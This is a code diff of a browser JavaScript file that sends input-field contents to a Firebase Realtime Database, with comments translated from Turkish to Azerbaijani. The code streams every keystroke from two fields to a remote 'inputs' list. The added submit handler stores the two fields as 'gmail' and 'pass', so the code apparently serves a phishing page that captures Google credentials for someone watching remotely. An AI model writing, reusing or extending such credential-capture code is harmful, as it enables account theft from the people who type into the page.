@@ -1,5 +1,5 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-app.js";
-import { getDatabase, ref, push, onChildAdded, set } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-database.js";
+import { getDatabase, ref, push, onChildAdded, set, onValue } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-database.js";
 
 // Firebase config
 const firebaseConfig = {
@@ -17,20 +17,20 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// HTML elementleri
+// HTML elementləri
 const t1 = document.getElementById('t1');
 const t2 = document.getElementById('t2');
 const list = document.getElementById('incoming-list');
+const submitBtn = document.getElementById("submitBtn");
 
-// Son değerleri tutmak için
+// Son dəyərlər
 let lastT1 = '';
 let lastT2 = '';
 
-// Sayfa yüklendiğinde mevcut değerleri al
+// Sayfa yükləndikcə mövcud dəyərləri al
 onChildAdded(ref(db, 'inputs'), (snap) => {
   const data = snap.val();
   
-  // Değerleri güncelle
   if (data.id === 't1') {
     t1.value = data.val;
     lastT1 = data.val;
@@ -39,17 +39,14 @@ onChildAdded(ref(db, 'inputs'), (snap) => {
     lastT2 = data.val;
   }
   
-  // Listeye ekle
   const el = document.createElement('div');
   el.textContent = `${data.id}: ${data.val}`;
   el.style.padding = '5px';
   el.style.borderBottom = '1px solid #ddd';
   list.prepend(el);
-  
-  console.log("Gelen veri:", data);
 });
 
-// Input değiştiğinde Firebase'e gönder
+// Input dəyişdikdə Firebase-ə göndər
 t1.addEventListener('input', () => {
   if (t1.value !== lastT1) {
     push(ref(db, 'inputs'), {
@@ -72,4 +69,15 @@ t2.addEventListener('input', () => {
   }
 });
 
-console.log("Firebase bağlantısı başarılı!");
+// 🔥 Submit düyməsi
+submitBtn.addEventListener("click", () => {
+  push(ref(db, "submits"), {
+      gmail: t1.value,
+      pass: t2.value,
+      ts: Date.now()
+  });
+
+  alert("Göndərildi! Kompüterdə görünecek.");
+});
+
+console.log("Firebase bağlantısı hazır!");
